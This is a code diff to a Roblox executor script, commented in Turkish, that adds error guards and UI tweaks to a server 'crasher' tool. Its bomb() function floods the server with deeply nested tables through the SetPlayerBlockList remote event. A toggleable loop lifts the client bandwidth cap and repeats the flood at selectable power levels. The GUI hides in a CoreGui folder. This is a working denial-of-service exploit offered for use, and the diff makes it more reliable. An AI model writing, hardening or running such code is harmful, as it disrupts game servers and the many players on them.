@@ -16,23 +16,29 @@ local NIVELES = {
 
 local nivelActual = "LOW"
 
+-- Config Kayıt Sistemi (Hata vermemesi için pcall içinde korumalı)
 local function SaveConfig()
     local data = {
         Nivel = nivelActual
     }
-    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
+    pcall(function() 
+        if writefile then
+            writefile(ConfigFile, HttpService:JSONEncode(data)) 
+        end
+    end)
 end
 
 local function LoadConfig()
-    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
-        pcall(function()
+    pcall(function()
+        if isfile and isfile(ConfigFile) then
             local data = HttpService:JSONDecode(readfile(ConfigFile))
             nivelActual = data.Nivel or "LOW"
-        end)
-    end
+        end
+    end)
 end
 LoadConfig()
 
+-- Paket göndererek ağ yükü oluşturan fonksiyon
 local function bomb(poder)
     local main, spam = {}, {{}}
     local z = spam[1]
@@ -45,8 +51,13 @@ local function bomb(poder)
     for i = 1, max do 
         table.insert(main, spam) 
     end
+    
+    -- Sunucu korumasına karşı pcall içine alındı
     pcall(function() 
-        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
+        local robloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+        if robloxReplicatedStorage and robloxReplicatedStorage:FindFirstChild("SetPlayerBlockList") then
+            robloxReplicatedStorage.SetPlayerBlockList:FireServer(main) 
+        end
     end)
 end
 
@@ -55,7 +66,12 @@ local laggerThread = nil
 
 local function startLaggerLoop()
     while laggerEnabled do
-        pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+        pcall(function() 
+            local nc = game:GetService("NetworkClient")
+            if nc then
+                nc:SetOutgoingKBPSLimit(80000) 
+            end
+        end)
         bomb(NIVELES[nivelActual].poder)
         task.wait(0.18)
     end
@@ -71,6 +87,7 @@ end
 
 local switchKnob, switchBg, toggleBtn, buttons
 
+-- Butona basıldığında UI animasyonunu ve arka plan döngüsünü tetikleyen fonksiyon
 local function setToggle(newState)
     laggerEnabled = newState
     local goal = newState and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
@@ -83,21 +100,24 @@ local function setToggle(newState)
 
     if newState then
         if laggerThread then task.cancel(laggerThread) end
-        laggerEnabled = true
         laggerThread = task.spawn(startLaggerLoop)
     else
         stopLaggerLoop()
     end
 end
 
+-- Doku silici optimizasyon (FPS arttırmak için)
 for _, v in pairs(workspace:GetDescendants()) do
-    if v:IsA("Texture") or v:IsA("Decal") then
-        v:Destroy()
-    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
-        v.Material = Enum.Material.SmoothPlastic
-    end
+    pcall(function()
+        if v:IsA("Texture") or v:IsA("Decal") then
+            v:Destroy()
+        elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
+            v.Material = Enum.Material.SmoothPlastic
+        end
+    end)
 end
 
+-- UI Klasör Kontrolü
 if not CoreGui:FindFirstChild("HiddenUI") then
     local f = Instance.new("Folder")
     f.Name = "HiddenUI"
@@ -112,6 +132,7 @@ gui.Name = "CrasherUI_Toggle"
 gui.ResetOnSpawn = false
 gui.Parent = CoreGui.HiddenUI
 
+-- Efektler için animasyonlu kenarlık fonksiyonu
 local function createAnimatedStroke(parent, thickness, speed)
     local s = Instance.new("UIStroke")
     s.Thickness = thickness or 1.5
@@ -141,6 +162,7 @@ local function createAnimatedStroke(parent, thickness, speed)
     return s, g
 end
 
+-- Ana Menü Penceresi
 local main = Instance.new("Frame")
 main.Size = UDim2.new(0, 220, 0, 135)
 main.Position = UDim2.new(0.5, -110, 0.5, -67)
@@ -156,6 +178,7 @@ mainCorner.Parent = main
 
 createAnimatedStroke(main, 2, 0.8)
 
+-- Başlık
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -24, 0, 30)
 title.Position = UDim2.new(0, 12, 0, 6)
@@ -182,6 +205,7 @@ task.spawn(function()
     end
 end)
 
+-- Lagger Açma/Kapama Satırı
 local toggleRow = Instance.new("Frame")
 toggleRow.Size = UDim2.new(1, -20, 0, 34)
 toggleRow.Position = UDim2.new(0, 10, 0, 42)
@@ -205,7 +229,7 @@ toggleLabel.Parent = toggleRow
 switchBg = Instance.new("Frame")
 switchBg.Size = UDim2.new(0, 36, 0, 18)
 switchBg.Position = UDim2.new(1, -46, 0.5, -9)
-switchBg.BackgroundTransparency = 1
+switchBg.BackgroundColor3 = Color3.fromRGB(30, 40, 65)
 switchBg.Parent = toggleRow
 
 Instance.new("UICorner", switchBg).CornerRadius = UDim.new(0, 9)
@@ -219,16 +243,20 @@ switchKnob.Parent = switchBg
 
 Instance.new("UICorner", switchKnob).CornerRadius = UDim.new(0, 7)
 
+-- Tıklama Alanı (Genişletildi, basmayı kolaylaştırır)
 toggleBtn = Instance.new("TextButton")
 toggleBtn.Size = UDim2.new(1, 0, 1, 0)
+toggleBtn.Position = UDim2.new(0, 0, 0, 0)
 toggleBtn.BackgroundTransparency = 1
 toggleBtn.Text = ""
+toggleBtn.ZIndex = 5
 toggleBtn.Parent = toggleRow
 
 toggleBtn.MouseButton1Click:Connect(function()
     setToggle(not laggerEnabled)
 end)
 
+-- Seviye Butonları Satırı (LOW, MID, HIGH)
 local modeRow = Instance.new("Frame")
 modeRow.Size = UDim2.new(1, -20, 0, 34)
 modeRow.Position = UDim2.new(0, 10, 0, 84)
@@ -262,6 +290,7 @@ local function createModeButton(name, order)
     btn.TextSize = 11
     btn.TextColor3 = Color3.new(1, 1, 1)
     btn.AutoButtonColor = false
+    btn.ZIndex = 5
     btn.Parent = modeRow
 
     Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
@@ -281,6 +310,7 @@ createModeButton("MID", 2)
 createModeButton("HIGH", 3)
 updateModeButtons()
 
+-- Sürükleme Mantığı (Menüyü ekranda hareket ettirebilmek için)
 local dragging, dragInput, dragStart, startPos
 
 local function update(input)
